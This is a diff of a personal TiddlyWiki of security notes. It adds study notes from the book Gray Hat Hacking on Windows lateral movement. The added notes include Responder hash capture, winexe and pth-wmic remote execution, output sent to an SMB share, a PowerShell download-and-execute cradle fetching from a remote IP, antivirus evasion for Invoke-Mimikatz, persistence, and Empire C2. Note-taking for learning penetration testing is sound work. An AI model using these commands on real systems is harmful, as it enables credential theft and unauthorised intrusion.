@@ -246,6 +246,8 @@ Error message and password prompt
 
 <li>Go Programming notes - 4</li>
 
+<li>Gray hat hacking Notes</li>
+
 <li>hash length extension attack</li>
 
 <li>HTB Notes</li>
@@ -8713,7 +8715,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20180424234616405" modified="20180517191701014" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Recent</pre>
 </div>
-<div list="[[Forensics Notes 2]]" title="$:/StoryList">
+<div list="[[Gray hat hacking Notes]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -9285,7 +9287,7 @@ Heap manager manages small allocations 8 bytes minimum
 
 Default Process heap is always created when process is created. GetProcessHeap returns handle to this heap. HeapCreate can create more heap. Heap size can be fixed or grow. Default is growable. Low Fragmentation Heap (LFH) deals with memory fragmentation issues.</pre>
 </div>
-<div created="20180424234251670" modified="20190514021725540" tags="" title="About">
+<div created="20180424234251670" modified="20190517000825472" tags="" title="About">
 <pre>This page contains random notes.
 Blog: &lt;a href=&quot;http://boredhackerblog.info&quot;&gt;http://boredhackerblog.info&lt;/a&gt;
 
@@ -9312,7 +9314,8 @@ Notes:
 [[Elasticsearch Notes]]
 
 [[Forensics]]
-</pre>
+
+[[Gray hat hacking Notes]]</pre>
 </div>
 <div created="20180806133453879" modified="20180806141733073" title="Advanced Malware Analysis: Combating Exploit Kits">
 <pre>Tools: JS Detox, Cerbero Profiler, Bytecode viewer, JPEXS Free Flash Decompiler, FlashDevelop, Wepawet (UCSB), Firefox addon javascript deobfuscator.
@@ -10888,6 +10891,64 @@ mychan = make(chan bool, 2) //two inputs
 
 close(mychan)
 ```</pre>
+</div>
+<div created="20190517000832326" modified="20190517004904876" title="Gray hat hacking Notes">
+<pre>Some notes from Gray hat hacking 5th edition (https://www.amazon.com/Gray-Hat-Hacking-Ethical-Handbook/dp/1260108414)
+
+DNS lookup process in Windows: check local files (hosts, LMHosts). DNS query to default nameserver. If that fails, Windows uses Link Local Multicast Name Resolution (LLMNR) or NetBIOS Name Service (NBNS).  Malicious actor can respond to LLMNR and NBNS requests. 
+
+tool: Responder- allows capturing hashes amongst other things. 
+
+`Responder.py -wf -I eth0` for -f for fingerprint, -w for wpad proxy server.
+
+DumpHash.py can be used to dump hashes in JTR format.
+
+Winexe - Windows remote admin tool. Requires IPC share. 
+
+`smbclient -U username%password -L IP`
+
+winexe: `winexe -U username%password --uninstall //IP cmd.exe`
+
+`winexe -U username%password --uninstall --system //IP cmd.exe`
+
+WMI - windows management instrumentation. Uses WMI Query Language (WQL). 
+
+`pth-wmic -U username%password //IP &quot;select ...&quot;`
+
+command exec via wmic: start smb server (impacket script) to save command output. `pth-wmis -U username%password /IP 'cmd.exe /c command &gt; \\smbIP\share\out.txt'`
+
+WinRM - windows remote management tool. communicates with SOAP and http or https. 
+
+tool: pywinrm. 
+
+`ghwinrm.py -c -U username%password -t IP command`
+
+powershell: `ghwinrm.py -p -U username%password -t IP &quot;powershell_command&quot;`
+
+powershell script: `ghwinrm.py -p -U username%password -t IP -f powershell_script`
+
+Powershell policies: 
+
+```
+Restricted - only system powershell commands can be run
+AllSigned - Scripts signed by trusted publisher
+RemoteSigned - Downloaded scripts signed by trusted publisher
+Unrestricted - Any script can run
+```
+
+Powershell commands through command line: `C:\...&gt; powershell -com powershell_command`
+
+Encoded commands: `powershell -enc base64_encoded_commands`
+
+Commands/scripts over web or smb: `&gt; powershell -com ^ IEX(iwr -UseBasicParsing http://IP/script.ps1)` For smb use UNC path (\\...\script.ps1)
+
+Powersploit: run web server with powersploit scripts then use them via iex...
+
+Edit invoke-mimikatz if AV flags it...
+
+Use Add-Persistence for creating persistence.
+
+Tool: Empire Project - for doing c2 stuff with powershell</pre>
 </div>
 <div created="20180616184048616" modified="20180616184124631" title="hash length extension attack">
 <pre>```
